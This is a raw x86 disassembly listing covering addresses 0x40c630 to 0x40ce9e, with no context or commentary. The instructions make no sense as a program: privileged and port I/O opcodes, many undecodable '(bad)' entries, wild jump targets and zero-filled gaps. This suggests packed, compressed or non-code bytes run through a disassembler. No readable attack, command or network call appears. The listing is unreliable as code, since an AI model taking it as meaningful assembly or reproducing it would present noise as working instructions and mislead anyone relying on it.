  40c630:	dec    ebp
  40c631:	xchg   esp,eax
  40c632:	psubusw mm4,QWORD PTR [eax]
  40c635:	mov    WORD PTR [edi+0x943ee43],ss
  40c63b:	jbe    0x40c5e5
  40c63d:	int    0x6f
  40c63f:	outs   dx,BYTE PTR ds:[esi]
  40c640:	mov    ch,0x2e
  40c642:	or     BYTE PTR [edi-0x2bf77ef1],ch
  40c648:	popa   
  40c649:	fxtract 
  40c64b:	sbb    dl,BYTE PTR [eax-0x4]
  40c64e:	cmc    
  40c64f:	dec    esi
  40c650:	push   ebp
  40c651:	inc    edx
  40c652:	sti    
  40c653:	xchg   edi,eax
  40c654:	mov    BYTE PTR [ebx-0x37ba7d85],bl
  40c65a:	hlt    
  40c65b:	add    BYTE PTR ss:[eax],al
	...
  40c66e:	add    BYTE PTR [eax],al
  40c670:	retf   
  40c671:	mov    eax,fs
  40c673:	xchg   DWORD PTR [esi-0x7a3909bd],edi
  40c679:	dec    ebp
  40c67a:	retf   
  40c67b:	in     eax,0x8f
  40c67d:	jmp    0x5751cc03
  40c682:	cmc    
  40c683:	mov    bh,0x7c
  40c685:	scas   al,BYTE PTR es:[edi]
  40c686:	or     BYTE PTR [ebx-0xe83bc88],dl
  40c68c:	aaa    
  40c68d:	fnstcw WORD PTR [esi-0xa]
  40c690:	xor    al,0xc
  40c692:	dec    esp
  40c693:	in     eax,dx
  40c694:	add    BYTE PTR [eax-0x6bb0ceac],cl
  40c69a:	sbb    DWORD PTR [eax+ebp*2],0xfe947cc
  40c6a1:	or     BYTE PTR [eax],0x55
  40c6a4:	mov    bl,0xac
  40c6a6:	addr16 dec ebx
  40c6a8:	dec    edi
  40c6a9:	xchg   esp,eax
  40c6aa:	pop    ebp
  40c6ab:	shr    DWORD PTR [eax-0x47],1
  40c6ae:	or     cl,ch
  40c6b0:	mov    BYTE PTR [ebp+edi*2-0x32],dl
  40c6b4:	popf   
  40c6b5:	sub    al,0xbe
  40c6b7:	imul   esp,esp,0x41
  40c6ba:	pop    ecx
  40c6bb:	adc    DWORD PTR [eax+0x2757e594],ecx
  40c6c1:	out    0x6a,eax
  40c6c3:	sub    BYTE PTR [eax-0x57ff0a1c],cl
  40c6c9:	mov    fs,eax
  40c6cb:	ret    
  40c6cc:	push   esp
  40c6cd:	pop    esp
  40c6ce:	imul   eax
  40c6d0:	icebp  
  40c6d1:	fdivrp st(5),st
  40c6d3:	inc    DWORD PTR [eax]
	...
  40c6e5:	add    BYTE PTR [eax],al
  40c6e7:	add    BYTE PTR [esi],cl
  40c6e9:	xchg   esi,eax
  40c6ea:	dec    esi
  40c6eb:	xor    BYTE PTR [ebx+0x2bfa7b98],0x6a
  40c6f2:	cmp    eax,eax
  40c6f4:	sbb    al,0x5d
  40c6f6:	idiv   edi
  40c6f8:	ret    0xa467
  40c6fb:	cmp    BYTE PTR [edx-0x2d],bh
  40c6fe:	mov    cl,0xff
  40c700:	sbb    BYTE PTR [edx-0x9],ch
  40c703:	jne    0x40c772
  40c705:	cs cs jbe 0x40c6ab
  40c709:	pop    esp
  40c70a:	push   edi
  40c70b:	pop    esi
  40c70c:	jl     0x40c765
  40c70e:	or     al,BYTE PTR [eax]
  40c710:	clc    
  40c711:	adc    dl,ah
  40c713:	sub    DWORD PTR [ecx+0x69],0x60
  40c717:	add    BYTE PTR [edi],cl
  40c719:	jp     0x40c710
  40c71b:	jne    0x40c73a
  40c71d:	shl    BYTE PTR cs:[ebp+0x22],0x6a
  40c722:	add    DWORD PTR [ebp+0x21],0x256a08b1
  40c729:	scas   al,BYTE PTR es:[edi]
  40c72a:	ja     0x40c78e
  40c72c:	mov    ah,0x98
  40c72e:	pusha  
  40c72f:	add    ch,dh
  40c731:	xchg   ebp,eax
  40c732:	mov    al,ch
  40c734:	jns    0x40c713
  40c736:	cmc    
  40c737:	(bad)  
  40c738:	out    dx,al
  40c739:	push   ebp
  40c73a:	jp     0x40c75b
  40c73c:	test   DWORD PTR [eax],esi
  40c73e:	dec    edx
  40c73f:	and    BYTE PTR [edx],0x6a
  40c742:	inc    esi
  40c743:	push   0xbee595e5
  40c748:	dec    ebp
  40c749:	mov    al,0x6a
  40c74b:	inc    ecx
	...
  40c760:	mov    ch,0x85
  40c762:	cmc    
  40c763:	jne    0x40c722
  40c765:	sub    eax,0x2a8ca146
  40c76a:	fsubrp st(7),st
  40c76c:	push   ebp
  40c76d:	mov    ds:0x40abfedd,eax
  40c772:	fdivp  st(6),st
  40c774:	sbb    DWORD PTR [ebx-0x1e],eax
  40c777:	retf   
  40c778:	and    edx,ecx
  40c77a:	(bad)  
  40c77c:	into   
  40c77d:	aaa    
  40c77e:	or     dl,BYTE PTR [ebp+0x17]
  40c781:	out    0x89,eax
  40c783:	ret    
  40c784:	and    BYTE PTR [ebp+0xa],0x6a
  40c788:	test   eax,0x640857ea
  40c78d:	pop    ebx
  40c78e:	pop    ecx
  40c78f:	jmp    FWORD PTR [ebx-0x3c]
  40c792:	inc    edi
  40c793:	cld    
  40c794:	hlt    
  40c795:	sub    ecx,DWORD PTR [edx]
  40c797:	out    dx,eax
  40c798:	sbb    dl,BYTE PTR [ebx-0x5f]
  40c79b:	popa   
  40c79c:	int    0x2b
  40c79e:	bound  edi,QWORD PTR [ecx-0xf61352]
  40c7a4:	mov    ecx,0xed5ae243
  40c7a9:	test   eax,0x8fb9fedd
  40c7ae:	fnsave [esp+edx*4-0x5d]
  40c7b2:	jnp    0x40c828
  40c7b4:	and    eax,DWORD PTR [edx-0x3b]
  40c7b7:	rcl    DWORD PTR [eax+0x208b392b],0xae
  40c7be:	enter  0x76fb,0x2b
  40c7c2:	pusha  
  40c7c3:	add    BYTE PTR cs:[eax],al
	...
  40c7d6:	add    BYTE PTR [eax],al
  40c7d8:	add    ebp,eax
  40c7da:	add    al,0xe8
  40c7dc:	shl    eax,0xdd
  40c7df:	inc    BYTE PTR ds:0x8c67d078
  40c7e5:	sub    ebp,edi
  40c7e7:	mov    ebp,0x4167f774
  40c7ec:	mov    ebx,ss
  40c7ee:	mov    bl,0x61
  40c7f0:	dec    ebp
  40c7f1:	sub    ebx,edi
  40c7f3:	je     0x40c789
  40c7f5:	xchg   esp,eax
  40c7f6:	xchg   edi,eax
  40c7f7:	and    ebp,ebp
  40c7f9:	inc    eax
  40c7fa:	xchg   edi,eax
  40c7fb:	imul   ecx,DWORD PTR [esp+edx*4+0x512b958e],0x2
  40c803:	inc    ebp
  40c804:	mov    WORD PTR [eax+ebp*4+0x76944d61],gs
  40c80b:	push   eax
  40c80c:	test   BYTE PTR [ecx+ebp*8],ch
  40c80f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40c810:	xchg   edx,eax
  40c811:	inc    eax
  40c812:	addr16 push eax
  40c814:	mov    BYTE PTR [eax-0x2b],al
  40c817:	or     esi,DWORD PTR [eax+eax*4-0x24]
  40c81b:	(bad)  
  40c81c:	jp     0x40c86c
  40c81e:	and    bh,bh
  40c820:	jae    0x40c80b
  40c822:	push   0xffffffe7
  40c824:	push   cs
  40c825:	pop    ecx
  40c826:	dec    esp
  40c827:	mov    bh,BYTE PTR [eax-0x1a0e855c]
  40c82d:	xchg   esp,eax
  40c82e:	ins    BYTE PTR es:[edi],dx
  40c82f:	inc    eax
  40c830:	push   eax
  40c831:	in     eax,0x26
  40c833:	push   eax
  40c834:	xchg   esp,eax
  40c835:	stos   BYTE PTR es:[edi],al
  40c836:	(bad)  
  40c838:	mov    eax,0x3116a4
	...
  40c84d:	add    BYTE PTR [eax],al
  40c84f:	add    BYTE PTR [eax+0x6b502019],bl
  40c855:	or     edi,DWORD PTR [ebp-0x2054e429]
  40c85b:	imul   ecx,DWORD PTR [esp+ebp*4-0x6b73fe0a],0xaa804ffe
  40c866:	out    0xd5,al
  40c868:	jge    0x40c802
  40c86a:	pop    ecx
  40c86b:	add    al,0x76
  40c86d:	xchg   esp,eax
  40c86e:	xlat   BYTE PTR ds:[ebx]
  40c86f:	mov    ebp,0x73df946d
  40c874:	repnz leave 
  40c876:	ret    
  40c877:	in     al,dx
  40c878:	imul   esi,DWORD PTR [ebx+0x52d503df],0xb4103e4
  40c882:	or     ebp,eax
  40c884:	or     eax,0x7b62f554
  40c889:	test   al,0x81
  40c88b:	sti    
  40c88c:	xor    eax,0xd4248394
  40c891:	iret   
  40c892:	cmc    
  40c893:	sbb    al,0x84
  40c895:	aas    
  40c896:	jl     0x40c879
  40c898:	xor    eax,0xb3fcf594
  40c89d:	ds pop ebx
  40c89f:	rcr    DWORD PTR [edx],1
  40c8a1:	(bad)  
  40c8a2:	jnp    0x40c872
  40c8a4:	add    al,0xe9
  40c8a6:	hlt    
  40c8a7:	pop    ecx
  40c8a8:	not    BYTE PTR [edx+eiz*2+0xa3ff7e9]
  40c8af:	jmp    0xf9bd0843
	...
  40c8c8:	in     eax,0x3f
  40c8ca:	neg    bl
  40c8cc:	imul   ebp,DWORD PTR [ebp+0x2c8fd308],0x70
  40c8d3:	retf   
  40c8d4:	(bad)  
  40c8d5:	xchg   esp,eax
  40c8d6:	cwde   
  40c8d7:	ss ret 
  40c8d9:	inc    eax
  40c8da:	loope  0x40c8d5
  40c8dc:	lods   al,BYTE PTR ds:[esi]
  40c8dd:	xchg   esp,eax
  40c8de:	or     BYTE PTR [eax],dh
  40c8e0:	dec    esi
  40c8e1:	(bad)
  40c8e5:	sub    ecx,DWORD PTR [edx-0x7619efd3]
  40c8eb:	mov    WORD PTR [edi],fs
  40c8ed:	aas    
  40c8ee:	jge    0x40c8dc
  40c8f0:	pop    eax
  40c8f1:	dec    ebp
  40c8f2:	retf   
  40c8f3:	aad    0x8f
  40c8f5:	or     ebx,DWORD PTR [ebp+ebx*8+0x4]
  40c8f9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40c8fa:	and    DWORD PTR [edi+eiz*1-0x27169d31],0xffffffc7
  40c902:	add    al,0xde
  40c904:	dec    edx
  40c905:	mov    WORD PTR [edx-0x17],fs
  40c908:	fadd   st,st(7)
  40c90a:	sbb    al,0xce
  40c90c:	popf   
  40c90d:	call   0xce75c99d
  40c912:	pop    edx
  40c913:	(bad)  
  40c914:	mov    al,0x1c
  40c916:	idiv   bh
  40c918:	in     eax,0x92
  40c91a:	adc    DWORD PTR [ebp+0x3d],0x708d180c
  40c921:	sbb    al,0x46
  40c923:	lea    esi,[eax+0x58]
  40c926:	inc    esi
  40c927:	push   0xffffffb5
  40c929:	addr16 jge 0x40c8e4
	...
  40c940:	sbb    al,BYTE PTR [ebp+0x1c888304]
  40c946:	div    BYTE PTR [ebx-0x30]
  40c949:	adc    eax,0xce1ac075
  40c94e:	sbb    al,0xff
  40c950:	add    BYTE PTR [edx-0x9],0x37
  40c954:	jmp    0xf58a:0x60ff04ce
  40c95b:	push   ebp
  40c95c:	jge    0x40c9c7
  40c95e:	aas    
  40c95f:	call   0x497d19
  40c964:	test   BYTE PTR [eax],0xa
  40c967:	jmp    FWORD PTR [eax]
  40c969:	es jge 0x40c94c
  40c96c:	into   
  40c96d:	sbb    al,BYTE PTR [ebx+0x180cbd55]
  40c973:	jmp    DWORD PTR [eax]
  40c975:	sbb    dh,bh
  40c977:	push   edx
  40c978:	cmp    eax,0x31c2bf89
  40c97d:	xchg   edx,eax
  40c97e:	pop    ebx
  40c97f:	mov    ebp,DWORD PTR [ecx]
  40c981:	adc    al,0xca
  40c983:	clc    
  40c984:	mov    ebp,DWORD PTR [eax-0x9]
  40c987:	push   edi
  40c988:	sahf   
  40c989:	outs   dx,BYTE PTR ds:[esi]
  40c98a:	sbb    BYTE PTR [ebx-0x772e8c9],cl
  40c990:	sti    
  40c991:	popa   
  40c992:	not    DWORD PTR [eax+0x5f]
  40c995:	cwde   
  40c996:	cmc    
  40c997:	jne    0x40c996
  40c999:	fisttp WORD PTR [eax]
  40c99b:	dec    DWORD PTR [eax+eiz*8-0x70c10104]
  40c9a2:	jg     0x40c963
	...
  40c9b8:	pop    ecx
  40c9b9:	loope  0x40c97c
  40c9bb:	test   al,bl
  40c9bd:	std    
  40c9be:	fsin   
  40c9c0:	mov    WORD PTR [ebx],gs
  40c9c2:	or     al,BYTE PTR [eax]
  40c9c4:	pop    ss
  40c9c5:	jmp    0xf704c78e
  40c9ca:	jne    0x40c9dd
  40c9cc:	or     DWORD PTR [ecx+0x26b3fdd8],edi
  40c9d2:	cmp    eax,0xdb2c118d
  40c9d7:	(bad)  
  40c9d8:	mov    ds:0x9b10569b,eax
  40c9dd:	mov    ah,al
  40c9df:	std    
  40c9e0:	xchg   ebx,eax
  40c9e1:	(bad)  
  40c9e2:	fst    DWORD PTR [ecx-0x68]
  40c9e5:	stos   BYTE PTR es:[edi],al
  40c9e6:	xchg   edi,eax
  40c9e7:	sti    
  40c9e8:	xor    BYTE PTR [esi-0x67000027],0x87
  40c9ef:	mov    esp,0xfed9e68c
  40c9f4:	imul   ebp,DWORD PTR [eax-0x2],0xfffffffe
  40c9f8:	fstp   DWORD PTR [ebx-0x25]
  40c9fb:	je     0x40c985
  40c9fd:	(bad)  es:[esp+eax*4-0x2d]
  40ca02:	add    edi,edi
  40ca04:	dec    ebx
  40ca05:	outs   dx,BYTE PTR ds:[esi]
  40ca06:	(bad)  
  40ca07:	(bad)  
  40ca08:	pushf  
  40ca09:	jbe    0x40c992
  40ca0b:	sti    
  40ca0c:	cmp    bl,BYTE PTR [esi-0x6dd08b27]
  40ca12:	mov    eax,ds:0xdaa3018a
  40ca17:	(bad)  
  40ca18:	and    eax,edx
  40ca1a:	(bad)  
  40ca1b:	inc    BYTE PTR [eax]
	...
  40ca2d:	add    BYTE PTR [eax],al
  40ca2f:	add    cl,ah
  40ca31:	xchg   edx,eax
  40ca32:	(bad)  
  40ca34:	adc    eax,DWORD PTR [esi+0x3c]
  40ca37:	or     BYTE PTR [ebx+0x74],ch
  40ca3a:	into   
  40ca3b:	jl     0xe7bffed5
  40ca41:	adc    ch,BYTE PTR [ebx+ecx*8+0x3adf3cf1]
  40ca48:	pop    ss
  40ca49:	out    0xd3,eax
  40ca4b:	jle    0x40caca
  40ca4d:	pcmpgtw mm1,mm3
  40ca50:	fnstcw WORD PTR [edi+esi*4]
  40ca53:	xor    esp,DWORD PTR [esi-0x6c]
  40ca56:	dec    ecx
  40ca57:	add    al,0xcb
  40ca59:	(bad)  
  40ca5a:	rcl    edx,cl
  40ca5c:	pop    ebp
  40ca5d:	jl     0x40cac3
  40ca5f:	ret    
  40ca60:	inc    eax
  40ca61:	mov    dl,0xae
  40ca63:	dec    eax
  40ca64:	mov    al,0x93
  40ca66:	fild   WORD PTR [ebx]
  40ca68:	mov    WORD PTR [ebx+ebp*2],fs
  40ca6b:	js     0x40ca08
  40ca6d:	cmp    eax,0xa206d28f
  40ca72:	fs dec eax
  40ca74:	nop
  40ca75:	jecxz  0x40cae3
  40ca77:	mov    BYTE PTR [edi-0x2c2d98c5],al
  40ca7d:	scas   al,BYTE PTR es:[edi]
  40ca7e:	out    dx,eax
  40ca7f:	rol    BYTE PTR [eax+0x3d],cl
  40ca82:	push   esi
  40ca83:	shl    BYTE PTR [edx+0x3c],cl
  40ca86:	mov    dl,0xff
  40ca88:	sbb    ebx,DWORD PTR [eax]
  40ca8a:	(bad)
  40ca8d:	or     al,0xb4
  40ca8f:	es or  edx,edi
  40ca92:	xor    edx,ecx
	...
  40caa8:	push   edx
  40caa9:	cmp    al,0x50
  40caab:	rol    al,cl
  40caad:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40caae:	es pop eax
  40cab0:	nop
  40cab1:	cmp    edx,DWORD PTR [ebp-0x1dd31d05]
  40cab7:	shl    BYTE PTR [edx],cl
  40cab9:	cmp    al,0x63
  40cabb:	retf   0x249b
  40cabe:	pop    es
  40cabf:	inc    eax
  40cac0:	and    BYTE PTR ds:0x300be975,ah
  40cac6:	inc    edi
  40cac7:	jle    0x40cac1
  40cac9:	cmp    al,0x9
  40cacb:	neg    ebp
  40cacd:	cmp    al,BYTE PTR [edx-0xeff2125]
  40cad3:	out    0xdd,eax
  40cad5:	cmp    dh,dh
  40cad7:	cmp    esi,eax
  40cad9:	fidivr DWORD PTR [edi+0x5b948cab]
  40cadf:	(bad)  
  40cae0:	in     al,dx
  40cae1:	cmp    bh,BYTE PTR [ecx+esi*8-0x44]
  40cae5:	rcl    BYTE PTR [eax],0xd1
  40cae8:	test   al,0xc6
  40caea:	cmc    
  40caeb:	mov    dh,0xdd
  40caed:	rol    BYTE PTR [ecx+eax*8],0xa3
  40caf1:	mov    ch,0x8
  40caf3:	jmp    0xa9cb26f6
  40caf8:	mov    ah,ah
  40cafa:	cmc    
  40cafb:	sbb    al,0x8c
  40cafd:	cmp    edi,DWORD PTR [ecx+esi*8-0x39]
  40cb01:	js     0x40cb7d
  40cb03:	xchg   BYTE PTR [ebp-0x432a83c6],bh
  40cb09:	rcr    BYTE PTR [eax],0x76
	...
  40cb20:	jecxz  0x40cabe
  40cb22:	loopne 0x40cae2
  40cb24:	fnstcw WORD PTR [ebx]
  40cb26:	div    BYTE PTR [eax]
  40cb28:	push   edx
  40cb29:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40cb2a:	or     BYTE PTR [eax+esi*8+0x67dcf62f],dh
  40cb31:	cmp    bh,BYTE PTR [ecx+esi*8+0x47]
  40cb35:	xor    bh,BYTE PTR [eax+0x46]
  40cb38:	cmp    eax,0x37ed7c3a
  40cb3d:	xchg   edi,eax
  40cb3e:	push   0x58d48fe9
  40cb43:	fisttp DWORD PTR cs:[eax+0x33279cf5]
  40cb4a:	add    DWORD PTR [ebx-0x6309c5a4],ebx
  40cb50:	and    edi,DWORD PTR [edx]
  40cb52:	jl     0x40cb4d
  40cb54:	cmp    al,0xc0
  40cb56:	adc    BYTE PTR [eax],al
  40cb58:	jge    0x40cba4
  40cb5a:	jns    0x40cb5b
  40cb5c:	adc    bh,dh
  40cb5e:	(bad)  
  40cb5f:	adc    al,0xf5
  40cb61:	add    DWORD PTR [ecx-0x25b38b14],0xf763f2f7
  40cb6b:	jne    0x40cafa
  40cb6d:	mov    ebx,0x63c1008c
  40cb72:	not    DWORD PTR [eax-0x2e]
  40cb75:	loope  0x40cb77
  40cb77:	call   0x381556
  40cb7c:	aas    
  40cb7d:	nop
  40cb7e:	bound  eax,QWORD PTR [eax]
  40cb80:	dec    ebp
  40cb81:	or     eax,DWORD PTR gs:[eax]
	...
  40cb98:	mov    ch,0xb9
  40cb9a:	mov    WORD PTR [eax],es
  40cb9c:	in     eax,dx
  40cb9d:	arpl   di,si
  40cb9f:	push   eax
  40cba0:	lahf   
  40cba1:	div    DWORD PTR gs:[ebp-0x5b]
  40cba5:	fmul   DWORD PTR [eax]
  40cba7:	push   0xffffffb5
  40cba9:	pop    esi
  40cbaa:	adc    al,0x60
  40cbac:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40cbad:	xchg   esi,eax
  40cbae:	int    0x85
  40cbb0:	adc    eax,0x65fff75c
  40cbb5:	xchg   esi,eax
  40cbb6:	or     BYTE PTR [eax],al
  40cbb8:	sub    dl,BYTE PTR [ebx]
  40cbba:	cli    
  40cbbb:	div    edx
  40cbbd:	or     BYTE PTR fs:[eax],al
  40cbc0:	gs xchg esi,eax
  40cbc2:	int    0x85
  40cbc4:	mov    ebp,0x75fff75c
  40cbc9:	xchg   esi,eax
  40cbca:	or     BYTE PTR [eax],al
  40cbcc:	stos   BYTE PTR es:[edi],al
  40cbcd:	adc    dh,dl
  40cbcf:	not    DWORD PTR [edx+0x35fff664]
  40cbd5:	xchg   esi,eax
  40cbd6:	adc    DWORD PTR [ebp+0x5d],0x256a17b9
  40cbdd:	mov    ebx,0x649af08c
  40cbe2:	not    DWORD PTR [eax-0x74]
  40cbe5:	mov    al,0x8e
  40cbe7:	jmp    0x40cc04
  40cbe9:	mov    ebx,eax
  40cbeb:	dec    edi
  40cbec:	or     DWORD PTR [ecx+0x3b13f6d1],ebp
  40cbf2:	cmp    edi,edi
  40cbf4:	sbb    DWORD PTR [ebx-0x27],0x5c2a9074
  40cbfb:	or     BYTE PTR [eax],al
	...
  40cc0d:	add    BYTE PTR [eax],al
  40cc0f:	add    BYTE PTR [esi+0x2b],ah
  40cc12:	(bad)  
  40cc13:	je     0x40cba9
  40cc15:	pop    edx
  40cc16:	cmp    eax,DWORD PTR [edi+ecx*1+0x21]
  40cc1a:	aad    0xf6
  40cc1c:	jecxz  0x40cc68
  40cc1e:	or     eax,0xd30100f
  40cc23:	add    BYTE PTR [esi+ebp*4+0x2c3eb97],cl
  40cc2a:	(bad)  
  40cc2b:	call   DWORD PTR [edx-0x73ff0a51]
  40cc31:	sub    ecx,edi
  40cc33:	test   al,bl
  40cc35:	and    al,dh
  40cc37:	dec    BYTE PTR [ebx+ebp*1+0x1334bdd7]
  40cc3e:	imul   eax,DWORD PTR [ecx-0x74],0xffffffc0
  40cc42:	jg     0x40cc43
  40cc44:	xchg   edi,eax
  40cc45:	mov    edx,0xe7744fc5
  40cc4a:	and    eax,0xccb08c00
  40cc4f:	jae    0x40cc1f
  40cc51:	push   0x7f
  40cc53:	sar    DWORD PTR [ebx-0x26],cl
  40cc56:	lds    eax,FWORD PTR [eax]
  40cc58:	mov    edx,ss
  40cc5a:	xchg   BYTE PTR [edi+0x66],ah
  40cc5d:	dec    ebp
  40cc5e:	dec    ebp
  40cc5f:	add    BYTE PTR [ecx],cl
  40cc61:	test   al,0xc
  40cc63:	cld    
  40cc64:	push   ebx
  40cc65:	jp     0x40cca3
  40cc67:	call   0x4aee5d
  40cc6c:	or     DWORD PTR [ebx+0x50],ebp
  40cc6f:	and    edx,DWORD PTR [ebx-0x6c]
  40cc72:	fs mov eax,0x0
	...
  40cc88:	cmp    bh,BYTE PTR [ecx]
  40cc8a:	pop    ss
  40cc8b:	add    cl,BYTE PTR [ecx+ebp*1-0x4a81a3a2]
  40cc92:	mov    al,ds:0xe00f0903
  40cc97:	iret   
  40cc98:	adc    bh,BYTE PTR [ecx]
  40cc9a:	nop
  40cc9b:	fist   DWORD PTR [ecx]
  40cc9d:	(bad)  
  40cc9f:	add    ecx,DWORD PTR [ecx]
  40cca1:	push   esp
  40cca2:	xlat   BYTE PTR ds:[ebx]
  40cca3:	mov    BYTE PTR [esi],ch
  40cca5:	xchg   esp,eax
  40cca6:	fild   WORD PTR [ebx]
  40cca8:	fs jb  0x40cced
  40ccab:	inc    ebp
  40ccac:	mov    WORD PTR [edi],es
  40ccae:	gs add esp,esp
  40ccb1:	cmp    bh,al
  40ccb3:	xor    esp,esp
  40ccb5:	stos   BYTE PTR es:[edi],al
  40ccb6:	aas    
  40ccb7:	add    al,0x8c
  40ccb9:	lea    ebx,[edi-0x2eac2a9]
  40ccbf:	xchg   ecx,eax
  40ccc0:	push   esi
  40ccc1:	rcr    edi,cl
  40ccc3:	add    ecx,DWORD PTR [ebx-0x73fc9ef0]
  40ccc9:	xchg   esp,eax
  40ccca:	xchg   esi,eax
  40cccb:	cwde   
  40cccc:	mov    bl,0x40
  40ccce:	lahf   
  40cccf:	into   
  40ccd0:	adc    cl,BYTE PTR [edi]
  40ccd2:	adc    dh,0x9a
  40ccd5:	cmp    BYTE PTR [edi+0x7740a798],cl
  40ccdb:	into   
  40ccdc:	sbb    dl,BYTE PTR [edx]
  40ccde:	test   dh,dl
  40cce0:	cmp    BYTE PTR [eax],0x55
  40cce3:	mov    BYTE PTR [ebx+0x40],ah
  40cce6:	outs   dx,DWORD PTR ds:[esi]
  40cce7:	into   
  40cce8:	ret    
  40cce9:	stos   BYTE PTR es:[edi],al
  40ccea:	loopne 0x40cd45
	...
  40cd00:	mov    WORD PTR [edx-0x5573a621],gs
  40cd06:	fild   WORD PTR [eax-0x31c8caf0]
  40cd0c:	push   edx
  40cd0d:	in     eax,0x36
  40cd0f:	clc    
  40cd10:	std    
  40cd11:	retf   
  40cd12:	or     BYTE PTR [eax-0x4a377471],ch
  40cd18:	shl    BYTE PTR [edi],cl
  40cd1a:	jl     0x40cd19
  40cd1c:	inc    edx
  40cd1d:	add    ecx,edx
  40cd1f:	push   ss
  40cd20:	pop    edx
  40cd21:	aaa    
  40cd22:	neg    BYTE PTR [ebx+esi*8+0x3e]
  40cd26:	test   BYTE PTR [esi],0x4a
  40cd29:	rcr    DWORD PTR [eax],0x6
  40cd2c:	hlt    
  40cd2d:	arpl   si,di
  40cd2f:	(bad)  
  40cd30:	fldcw  WORD PTR [edi]
  40cd32:	sbb    edi,esi
  40cd34:	shl    DWORD PTR [esi],1
  40cd36:	div    BYTE PTR [ebx+ebp*1]
  40cd39:	aas    
  40cd3a:	mul    dh
  40cd3c:	shr    BYTE PTR [ebp+0x2b8fe956],1
  40cd42:	adc    al,0xd6
  40cd44:	cmp    esp,DWORD PTR [eax+0x3eb894f5]
  40cd4a:	test   dh,0xc1
  40cd4d:	add    ch,ah
  40cd4f:	mov    dh,0xd9
  40cd51:	idiv   BYTE PTR ss:[eax+edi*4]
  40cd55:	ss mov esp,0xf636e195
  40cd5b:	xchg   ecx,eax
  40cd5c:	stos   BYTE PTR es:[edi],al
  40cd5d:	cmp    dh,dh
  40cd5f:	sahf   
  40cd60:	fld    DWORD PTR [eax]
  40cd62:	in     eax,0x9e
	...
  40cd78:	shl    DWORD PTR [esi],1
  40cd7a:	loope  0x40cd85
  40cd7c:	imul   edx,DWORD PTR [eax+ecx*1+0x8a3ceb0],0x8a2c0514
  40cd87:	lods   eax,DWORD PTR ds:[esi]
  40cd88:	sbb    cl,ah
  40cd8a:	cmc    
  40cd8b:	hlt    
  40cd8c:	jnp    0x40cdbd
  40cd8e:	add    al,dh
  40cd90:	(bad)  
  40cd91:	xchg   esp,eax
  40cd92:	add    DWORD PTR [ecx],ebp
  40cd94:	ret    
  40cd95:	xchg   ecx,eax
  40cd96:	push   esi
  40cd97:	and    BYTE PTR [esi-0x75],cl
  40cd9a:	or     BYTE PTR [eax],bh
  40cd9c:	jo     0x40cdb0
  40cd9e:	leave  
  40cd9f:	add    BYTE PTR [edi-0x44],ah
  40cda2:	lds    ecx,FWORD PTR [ebp+0x524656f0]
  40cda8:	jp     0x40cd89
  40cdaa:	add    al,0xe8
  40cdac:	pushf  
  40cdad:	mov    bh,0xf6
  40cdaf:	call   FWORD PTR [esi-0x6]
  40cdb2:	or     BYTE PTR [ebp+0x61],0x5d
  40cdb6:	add    BYTE PTR [esi],dh
  40cdb8:	sub    ah,BYTE PTR [ecx]
  40cdba:	dec    edx
  40cdbb:	sub    DWORD PTR [ecx],ebx
  40cdbd:	xchg   edx,eax
  40cdbe:	dec    ebx
  40cdbf:	aam    0xe4
  40cdc1:	adc    esi,ecx
  40cdc3:	adc    al,0x87
  40cdc5:	bound  esp,QWORD PTR [ebx]
  40cdc7:	imul   BYTE PTR [edi+ebx*8-0x28]
  40cdcb:	jmp    0x40cd9a
  40cdcd:	mov    al,ds:0x96a1b605
  40cdd2:	in     al,0x50
  40cdd4:	cmp    eax,0xf54169b2
  40cdd9:	mov    ch,0x4c
  40cddb:	fadd   DWORD PTR [eax]
	...
  40cded:	add    BYTE PTR [eax],al
  40cdef:	add    BYTE PTR [ebp-0x1aa0f9a8],dl
  40cdf5:	xchg   edx,eax
  40cdf6:	mov    esp,eax
  40cdf8:	mov    ecx,0xa5d84cb5
  40cdfd:	dec    ecx
  40cdfe:	jge    0x40cdd0
  40ce00:	int    0xec
  40ce02:	jnp    0x40ce03
  40ce04:	jmp    0xf415:0x73d04cb9
  40ce0b:	adc    al,0x87
  40ce0d:	add    eax,0x47e16589
  40ce12:	idiv   bh
  40ce14:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40ce15:	inc    edi
  40ce16:	jge    0x40cdec
  40ce18:	popf   
  40ce19:	mov    dl,0x69
  40ce1b:	inc    ecx
  40ce1c:	jne    0x40cdd5
  40ce1e:	dec    esp
  40ce1f:	fcom   DWORD PTR [ebp+0x655ed658]
  40ce25:	xchg   edx,eax
  40ce26:	mov    esp,eax
  40ce28:	jns    0x40cde1
  40ce2a:	dec    esp
  40ce2b:	fmul   DWORD PTR [ebx+edi*8-0x2bc38b3c]
  40ce32:	(bad)  
  40ce33:	jne    0x40ce88
  40ce35:	iret   
  40ce36:	jb     0x40ce7c
  40ce38:	pop    esp
  40ce39:	test   eax,0x7edccc4e
  40ce3e:	pop    esi
  40ce3f:	shl    BYTE PTR [esi+ecx*2+0x6e8c4169],1
  40ce46:	push   ds
  40ce47:	fcom   st(4)
  40ce49:	in     al,dx
  40ce4a:	or     eax,ebp
  40ce4c:	fstp   DWORD PTR [eax]
  40ce4e:	(bad)  
  40ce51:	imul   esi,esp,0xffffff83
	...
  40ce68:	sti    
  40ce69:	sub    ecx,DWORD PTR [edx]
  40ce6b:	add    BYTE PTR ds:0x8182b1f1,dl
  40ce71:	outs   dx,DWORD PTR ds:[esi]
  40ce72:	or     DWORD PTR [edi],ecx
  40ce74:	adc    BYTE PTR [edx+0x2e8c0009],ch
  40ce7a:	pop    eax
  40ce7b:	or     al,0xf4
  40ce7d:	ins    DWORD PTR es:[edi],dx
  40ce7e:	and    al,BYTE PTR [eax]
  40ce80:	mov    esp,?
  40ce82:	in     al,dx
  40ce83:	or     ah,0x29
  40ce86:	jne    0x40cecc
  40ce88:	sbb    al,0x4f
  40ce8a:	pop    eax
  40ce8b:	or     al,0x1b
  40ce8d:	jno    0x40ce27
  40ce8f:	(bad)  
  40ce90:	cmp    edi,ebp
  40ce92:	jno    0x40ced8
  40ce94:	int3   
  40ce95:	out    0x57,al
  40ce97:	enter  0x6903,0xc8
  40ce9b:	(bad)  
  40ce9c:	push   ecx
  40ce9d:	xlat   BYTE PTR ds:[ebx]
  40ce9e:	or     al,0x0
